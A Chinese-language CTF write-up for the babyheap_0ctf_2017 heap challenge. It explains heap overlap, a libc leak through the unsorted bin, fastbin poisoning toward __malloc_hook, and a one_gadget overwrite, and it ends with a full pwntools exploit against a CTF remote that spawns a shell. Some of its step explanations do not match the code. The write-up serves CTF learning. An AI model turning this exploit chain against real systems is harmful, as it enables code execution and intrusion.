DATE 2026-07-11

TAG heap, 堆重叠, 堆溢出, fastbin劫持, unsorted bin泄露, 伪造chunk, hook劫持

SUMMARY 通过篡改堆块 size制造堆重叠，结合fastbin劫持伪造链表指向 __malloc_hook 附近，利用unsorted bin泄露libc基址，最终覆盖 __malloc_hook 为 one_gadget 触发 getshell。核心是堆元数据操控和钩子函数劫持

TITLE babyheap_0ctf_2017 堆利用

## glibc 2.34 之后被移除（__malloc_hook 钩子函数）

# 这道题也是很难的一道题（对目前的我来说）

先checksec发现全开，反汇编发现是自定义堆管理。

# 我们第一步需要先拿到libc基址

先申请五个堆，

释放堆1和堆2，再修改堆1和2的prev_size，size和fd，将2的fd修改为指向chunk4

再修改堆4的为0x21，prev_size为0

接着申请两个0x10的堆，把chunk1和4分配出去。接着修改堆4的size为0x91

接着申请一个0x91的堆，再释放chunk4，防止被glibc和top chunk合并，这样chunk4就进入了unsorted bin


计算libc基址的方法：
info proc map 看第一行的libc起始值
p &main_arena 查看地址
先用main_arena-看到的libc起始值
再用fd指向的地址减去main_arena的值
接着将两者相加即可得到libc基址


---
## 整体目标

通过伪造 fastbin 的 `fd` 指针，让 `malloc` 返回一个**指向 `__malloc_hook` 附近的 chunk**，然后覆盖 `__malloc_hook` 为 one_gadget，下一次调用 `malloc` 时触发 getshell。

---

## 完整流程图


┌─────────────────────────────────────────────────────────────┐
│  1. 堆风水：布置好堆块布局                                   │
│     allocate(0x10) → 0,1,2,3                              │
│     allocate(0x80) → 4                                    │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  2. free(1) → 进入 fastbin                                  │
│  3. free(2) → 进入 fastbin (头插法，2 在链表头部)            │
│  4. edit(0) 伪造 fake chunk 元数据                          │
│  5. 控制堆块 3 的 size 字段为 0x91                          │
│  6. allocate(0x80) 触发堆合并/布局调整                       │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  7. free(4) → 0x80 大小的 chunk 进入 unsorted bin           │
│  8. show(2) 泄露 libc 地址（main_arena.top）                │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  9. 计算 libc_base                                          │
│  10. 伪造 fake_chunk = __malloc_hook - 0x23                │
│  11. edit(2) 将 fake_chunk 写入 fastbin 的 fd              │
│  12. allocate(0x60) 两次，拿到 __malloc_hook 附近的 chunk   │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  13. edit(6) 覆盖 __malloc_hook 为 one_gadget              │
│  14. allocate(0x10) 触发 malloc → 执行 one_gadget → shell   │
└─────────────────────────────────────────────────────────────┘

---

## 分步详解

### 第 1-3 步：堆布局 + 释放两个 chunk

allocate(0x10)  # 0
allocate(0x10)  # 1
allocate(0x10)  # 2
allocate(0x10)  # 3
allocate(0x80)  # 4
free(1)  # 1 进入 fastbin
free(2)  # 2 进入 fastbin（头插法，2 在前面）

此时 fastbin 链表状态：

fastbin[0] (0x20): 2 → 1 → NULL
                    ↑
                下一次 malloc(0x10) 会先分配 2

---

### 第 4-6 步：伪造堆块元数据 + 触发合并

payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)
edit(0, payload)

这里有一个现象，就是原本 chunk1 和 chunk2 都是在fastbins里的，但是在edit之后就可以发现chunk1显示的已分配而chunk2还是处于fastbins中的，这是因为chunk2原本指向的chunk1，但是修改了chunk2的fd指针后，chunk1没有被任何chunk所指向，于是glibc就会出错，导致误认为chunk1是被分配的状态。但是为什么chunk4没有被标记为已释放呢，这是因为chunk4的大小不满足fastbins的范围，所以不会被放入fastbins中，也就不会显示已释放。

但是在后续edit3的时候，由于chunk4的size被修改为0x21，所以被识别为chunk2的fd_chunk，导致显示的是被放入fastbins中的：

![[Pasted image 20260711191625.png]]

接着又申请了两个0x21的chunk，于是chunk4就名正言顺的成为0x21大小的chunk了

![[Pasted image 20260711191808.png]]

然后又修改chunk4的size为0x91，紧接着申请了一个0x91的chunk，然后又释放了chunk4，这里加一个chunk5的原因是为了防止chunk4被释放后直接与Top chunk合并而不是进入unsorted bin中（因为这里我们要利用的是unsorted bin泄露 malloc_hook），

接着就获取chunk2的数据。


# 调整堆块 3 的 size 字段
payload = p64(0) * 3 + p64(0x91)
edit(3, payload)
allocate(0x10)  # 5  → 分配 2
allocate(0x10)  # 6  → 分配 1
allocate(0x80)  # 7  → 分配 4 后面的大块

这步的目的是：

- **把 fastbin 里的 chunk 分配回来，产生重叠**
  
- **伪造堆块 3 的 size，让它在 free 时进入 unsorted bin**
  
- **泄露 libc 地址**
  

---

### 第 7-8 步：泄露 libc 地址

free(4)               # 0x80 chunk 进入 unsorted bin

`fd` 和 `bk` 指向 `main_arena+88`（即 unsorted bin 的链表头）。因为 unsorted bin 是双向循环链表，只有一个 chunk 时，它的 `fd` 和 `bk` 都指向 `main_arena` 中的链表头指针。地址 `0x7f3e7ce96b78` 就是 `main_arena+88`，这是 ptmalloc 的管理结构，不是堆地址。

show(2)               # 打印 chunk 2 的内容
leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

**为什么能泄露？**

- `free(4)` 后，`chunk 4` 进入 unsorted bin
  
- `chunk 4` 的 `fd` 和 `bk` 指针指向 `main_arena`
  
- `chunk 2` 和 `chunk 4` 在内存中重叠，所以 `show(2)` 能读到 `main_arena` 的地址


<font size=8 color=blue>这里的泄露手法用的是堆重叠</font>
# 这里的泄露手法用的是堆重叠

## 堆重叠详细解释：

堆重叠是指两个或多个堆块在物理内存地址上部分或完全重合，导致一个堆块的操作（读写、释放）会影响到另一个堆块的元数据或用户数据。通常通过篡改堆块的 `size` 字段或伪造指针实现，用于绕过内存隔离，达到任意地址读写或控制程序流的目的。



---

### 第 9 步：计算 libc 基址

libc_base = leak - 0x3c4b78

`leak` 指向 `main_arena.top`，`main_arena.top` 在 libc 中的偏移是 `0x3c4b78`。

这里算libc基址的手法就是先gdb调试，用vmmap查看libc基址，再用leak-libc基址，就可以得到对应的偏移，把这个偏移放在程序里用就行了

![[Pasted image 20260711192940.png]]

---

### 第 10-11 步：伪造 fastbin chunk

fake_chunk = libc_base + 0x3c4aed  # __malloc_hook - 0x23
edit(2, p64(fake_chunk))

**`0x3c4aed` 处有一个天然的 `0x7f` 作为 size 字段。**

此时 fastbin 链表：

fastbin[0] (0x20): 2 → fake_chunk → NULL

---

### 第 12 步：两次 malloc 拿到 `__malloc_hook` 附近的 chunk

allocate(0x60)  # 8  → 分配 chunk 2
allocate(0x60)  # 9  → 分配 fake_chunk（即 __malloc_hook - 0x23）

**现在 `chunk 9` 指向 `__malloc_hook - 0x23`，偏移 0x13 字节后就是 `__malloc_hook`。**

---

### 第 13 步：覆盖 `__malloc_hook`

payload = b'a' * 0x13 + p64(libc_base + 0x4526a)
edit(6, payload)

- `0x13` 字节填充：从 `__malloc_hook - 0x23` 到 `__malloc_hook`
  
- 然后写入 one_gadget 地址
  

---

### 第 14 步：触发 getshell

allocate(0x10)  # 触发 malloc → 调用 __malloc_hook → one_gadget → shell

---

## 一句话总结

堆重叠泄露 libc → 伪造 fastbin 指向 __malloc_hook-0x23 → 
分配到该地址 → 覆盖 __malloc_hook 为 one_gadget → malloc 触发 getshell


---

# exp


```python
from pwn import *

# 连接目标
io = remote("2172dcbd1cb6398af5d63151.tcp-ctf2.dasctf.com", 9999, ssl=True)
# io = process('./babyheap')

# 加载 libc
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# context.log_level = 'debug'

# ---------- 交互函数 ----------
def choice(cmd):
    io.sendlineafter('Command: ', str(cmd))

def allocate(size):
    choice(1)
    io.sendlineafter('Size: ', str(size))

def edit(index, content):
    choice(2)
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('Size: ', str(len(content)))
    io.sendlineafter('Content: ', content)

def free(index):
    choice(3)
    io.sendlineafter('Index: ', str(index))

def show(index):
    choice(4)
    io.sendlineafter('Index: ', str(index))

# ---------- 漏洞利用 ----------

# 1. 分配 5 个堆块
allocate(0x10)  # 0
allocate(0x10)  # 1
allocate(0x10)  # 2
allocate(0x10)  # 3
allocate(0x80)  # 4

# 2. 释放 1 和 2，进入 tcache/fastbin
free(1)
free(2)

# 3. 利用 edit(0) 构造伪造的堆块元数据
payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)
edit(0, payload)

# 4. 再次编辑，调整堆布局
payload = p64(0) * 3 + p64(0x21)
edit(3, payload)

# 5. 分配两个 0x10 堆块，触发堆布局变化
allocate(0x10)  # 5
allocate(0x10)  # 6

# 6. 修改堆块 3，伪造大小为 0x91
payload = p64(0) * 3 + p64(0x91)
edit(3, payload)

# 7. 分配 0x80 堆块，并释放 4
allocate(0x80)  # 7
free(4)

# 8. 泄露 libc 地址
show(2)
leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print('[+] leak: ' + hex(leak))

libc_base = leak - 0x3c4b78
print('[+] libc_base: ' + hex(libc_base))

# 9. 构造 fake_chunk 并利用
# 这里的地址是__malloc_hook的地址
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep malloc_hook
# 因为 `__malloc_hook - 0x23` 地址处的内存布局，**天然有一个 0x7f 可以作为 fake chunk 的 size 字段**：
fake_chunk = libc_base + 0x3c4aed
allocate(0x60)  # 8
free(4)

edit(2, p64(fake_chunk))

allocate(0x60)  # 9
allocate(0x60)  # 10

# 10. 修改 __malloc_hook 为 one_gadget
# 这里的地址是one_gadget的偏移
# one_gadget /lib/x86_64-linux-gnu/libc-2.23.so
payload = b'a' * 0x13 + p64(libc_base + 0x4526a)
edit(6, payload)

# 11. 触发 getshell
allocate(0x10)

io.interactive()
```


---
# 0x3c4aed怎么来的：

## 第一步我们要找的是__malloc_hook所在的地址空间

- 这一步使用 `readelf -s /lib/x86_64-linux-gnu/libc-2.23.so | grep malloc_hook`

得到的是：
![[Pasted image 20260708151832.png]]

## 第二步就是查看并寻找一处合适的地址空间来存储one_gadget

- 这一步使用 `objdump -s -j .data /lib/x86_64-linux-gnu/libc-2.23.so | grep -A 5 -B 5 "3c4b10"`

得到的是：
![[Pasted image 20260708151926.png]]
<font size=6 color=yellow>可以发现0x3c4af0这里有完整的空地址，再 0x3c4af0 - 0x3 就可以得到 0x3c4aed</font>

### 这里说一下为什么不能用0x3c4b10上面的地址和下面的地址

- 上面的那个就不用说了，因为它没有完整的0x8字节空间，重点说下面
- 下面主要是因为这里是main_arena的起始地址：
- 根据调试如下，main_arena在当前libc中的偏移是0x3c4b20

![[Pasted image 20260708152752.png]]

- 如果选下面的地址，就会覆盖main_arena，导致程序报错

---
# 0x4526a怎么来的

这里主要是要找一个可以用的one_gadget，
用命令：`one_gadget /lib/x86_64-linux-gnu/libc-2.23.so` 即可获取想要的one_gadget
![[Pasted image 20260708153111.png]]

>[!IMPORTANT]
>注意这里的one_gadget调用时要注意是否能满足对应的约束条件


---



